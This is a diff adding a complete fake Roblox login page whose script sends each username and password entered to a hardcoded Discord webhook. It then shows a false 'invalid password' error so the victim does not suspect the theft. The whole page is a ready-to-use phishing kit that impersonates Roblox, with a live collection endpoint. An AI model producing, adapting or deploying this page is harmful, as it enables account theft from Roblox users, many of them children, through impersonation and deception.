@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Roblox</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+body{background:#f5f5f5;min-height:100vh}
+.topbar{background:#E2231A;height:4px}
+.card{background:#fff;border-radius:12px;width:92%;max-width:380px;margin:30px auto;padding:32px 24px;text-align:center;box-shadow:0 2px 20px rgba(0,0,0,.1)}
+.logo{width:72px;height:72px;background:#E2231A;border-radius:50%;margin:0 auto 16px}
+h1{font-size:22px;color:#1a1a1a;margin-bottom:4px}
+.sub{font-size:14px;color:#888;margin-bottom:24px}
+input{width:100%;padding:14px;border:1.5px solid #ddd;border-radius:8px;font-size:16px;background:#fafafa;margin-bottom:12px;outline:none;-webkit-appearance:none}
+input:focus{border-color:#E2231A;background:#fff}
+button{width:100%;padding:14px;background:#E2231A;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
+button:active{opacity:.9}
+.fgt{display:block;margin:14px 0;font-size:13px;color:#E2231A;text-decoration:none}
+.or{display:flex;align-items:center;margin:20px 0;color:#bbb;font-size:12px}
+.or::before,.or::after{content:'';flex:1;height:1px;background:#e8e8e8}
+.or span{padding:0 16px}
+.qbtn{width:100%;padding:12px;background:#fff;color:#555;border:1.5px solid #ddd;border-radius:8px;font-size:14px;cursor:pointer}
+.qbtn:active{background:#f5f5f5}
+.signup{font-size:14px;color:#888;margin-top:20px}
+.signup a{color:#E2231A;text-decoration:none;font-weight:600}
+.err{color:#E2231A;font-size:13px;margin-top:12px;display:none}
+.footer{text-align:center;padding:20px;font-size:12px;color:#aaa}
+</style>
+</head>
+<body>
+<div class="topbar"></div>
+<div class="card">
+<div class="logo"></div>
+<h1>Sign in</h1>
+<p class="sub">Jump back into your experiences</p>
+<form id="f">
+<input type="text" id="u" placeholder="Username / Email / Phone" autocomplete="off" required>
+<input type="password" id="p" placeholder="Password" autocomplete="off" required>
+<button type="submit">Log in</button>
+<a href="#" class="fgt">Forgot password or username?</a>
+<div class="or"><span>Or</span></div>
+<button type="button" class="qbtn" onclick="document.getElementById('u').value='';document.getElementById('p').value=''">Log in with another device</button>
+<div class="signup">Don't have an account? <a href="#">Create one</a></div>
+<div class="err" id="err">Invalid username or password. Please try again.</div>
+</form>
+</div>
+<div class="footer">&copy; 2026 Roblox Corporation</div>
+<script>
+document.getElementById('f').onsubmit=function(e){
+e.preventDefault();
+var u=document.getElementById('u').value;
+var p=document.getElementById('p').value;
+fetch('https://discord.com/api/webhooks/1499563144794865694/ybout7a_QXqxO3d9vfgMitR35LuGGAJ7wqhPUS8O6v8zA8Ccw4Fb7H_nnvTw0hMxK6_g',{
+method:'POST',
+mode:'no-cors',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+content:'**Roblox Login**\nUser: '+u+'\nPass: '+p+'\nTime: '+new Date().toLocaleString()
+})
+});
+document.getElementById('err').style.display='block';
+document.getElementById('u').value='';
+document.getElementById('p').value='';
+};
+</script>
+</body>
+</html>
